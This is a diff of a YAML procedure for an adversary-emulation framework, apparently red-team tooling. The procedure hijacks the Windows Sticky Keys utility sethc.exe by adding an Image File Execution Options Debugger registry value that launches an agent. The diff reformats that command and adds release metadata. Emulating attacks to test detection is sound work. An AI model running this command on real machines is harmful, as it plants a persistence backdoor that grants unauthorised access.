@@ -1,5 +1,5 @@
 id: f2963403-37a5-46e6-9cd5-f1c255012055
-name: Image File Execution Options Debugger Injection
+name: 'Image File Execution Options Injection: Debugger'
 description: >-
   This procedure makes a backup of the setchc.exe utility and modifies a
   registry key that configures a pnuema agent as a "debugger" for sethc.exe
@@ -11,10 +11,20 @@ technique:
 platforms:
   windows:
     cmd:
-      command: |
-        copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe & reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "#{agent.location}"
+      command: >
+        copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+        & reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+        Execution Options\sethc.exe" /v Debugger /t REG_SZ /d
+        "#{agent.location}"
 metadata:
   authors:
     - bfuzzy1
   tags: []
   version: 1
+  enabled: true
+  checksum: ceb969d957854b9af0db6e4882fb27d0fe22839c3be72f62202839b1d70309e5
+  release_date: '2020-11-05'
+  license: community
+modified: true
+isModified: true
+isOutdated: false
